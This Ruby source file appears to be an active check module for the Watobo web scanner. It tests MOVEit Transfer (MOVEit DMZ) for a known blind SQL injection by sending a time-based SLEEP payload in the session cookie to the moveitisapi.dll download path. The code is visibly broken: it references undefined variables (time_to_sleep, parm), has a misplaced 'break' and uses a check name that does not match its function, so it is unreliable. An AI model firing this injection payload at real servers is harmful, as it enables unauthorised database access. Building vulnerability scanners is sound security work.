# @private
module Watobo #:nodoc: all
  module Modules
    module Active
      module Ipswitch
        #class Dir_indexing < Watobo::Mixin::Session
        class Moveit_sqlinjection < Watobo::ActiveCheck

          @info.update(
              :check_name => 'MoveIt DMZ Version', # name of check which briefly describes functionality, will be used for tree and progress views
              :description => "This module performs SQL injection checks.", # description of checkfunction
              :author => "Andreas Schmidt", # author of check
              :version => "1.0", # check version
              :check_group => "IPSwitch MoveIT"
          )

          @finding.update(
              :threat => "There's a blind SQL injection vulnerability in older MOVEit Transfer aka MOVEit DMZ versions", # thread of vulnerability, e.g. loss of information
              :class => "MoveIT DMZ: SQLInjection", # vulnerability class, e.g. Stored XSS, SQL-Injection, ...
              :type => FINDING_TYPE_VULN, # FINDING_TYPE_HINT, FINDING_TYPE_INFO, FINDING_TYPE_VULN
              :rating => VULN_RATING_CRITICAL,
              :references => ['https://www.siberas.de/assets/papers/ssa-1705_IPSWITCH_SQLinjection.txt']
          )

          def initialize(project, prefs={})
            super(project, prefs)

            @checked_locations = []
          end

          def reset()
            @checked_locations = []
          end

          def generateChecks(chat)
            dir = chat.request.dir
            return false if @checked_locations.include? dir
            @checked_locations << dir

            checker = proc {
              begin
                test_request = nil
                test_response = nil


                rtimes = []

                vulnerable = false

                3.times do
                  test = chat.copyRequest
                  start = Time.now().to_i
                  timing_request, timing_response = doRequest(test, :default => true)
                  stop = Time.now().to_i
                  rtimes << (stop - start)

                end
                # now calculate the average time
                average_t = rtimes.inject(:+) / rtimes.length
                max_t = rtimes.max > 5 ? rtimes.max : 5

                timeout_t = 2 * max_t

                test_value = ""
                test = nil

                timeout_counter = 0
                output = ""
                break if vulnerable
                begin
                  sqli_start = Time.now().to_i
                  timeout(rtimes.max) do
                    test = chat.copyRequest
                    test.set_header('X-siLock-AgentBrand', 'yourout')
                    test.set_header("Cookie", "ASP.NET_SessionId=1111111111\' AND (SELECT * FROM (SELECT(SLEEP(#{timeout_t})))AAAA) -- ;")

                    moveit_path = dir + '/moveitisapi/moveitisapi.dll?action=download'

                    test.set_path moveit_path

                    test_request, test_response = doRequest(test, :default => true)
                    sqli_stop = Time.now().to_i
                  end
                rescue Timeout::Error
                  duration = sqli_stop - sqli_start
                  #  puts duration
                  if (duration >= time_to_sleep)
                    puts "Found time-based SQLi in parameter #{parm} !!!"
                    puts "after #{duration}s / time-to-sleep #{time_to_sleep}s)"
                    test_request.extend Watobo::Mixin::Parser::Url unless test_request.respond_to? :path
                    path = "/" + test_request.path

                    vulnerable = true
                    output << "SleepTime: #{time_to_sleep}\nQuery Duration: #{duration}s"

                    addFinding(test_request, test_response,
                               :check_pattern => "#{test_value}",
                               :chat => chat,
                               :title => "MOVEit SQLinjection",
                               :proof_pattern => "",
                               :test_item => parm[:name],
                               :class => "MOVEit SQL-Injection",
                               :output => output
                    )

                  end

                rescue => bang
                  puts bang
                  puts bang.backtrace
                end


              rescue => bang
                puts bang
                puts bang.backtrace if $DEBUG
              end
              [test_request, test_response]

            }
            yield checker
          end
        end
      end
    end
  end
end
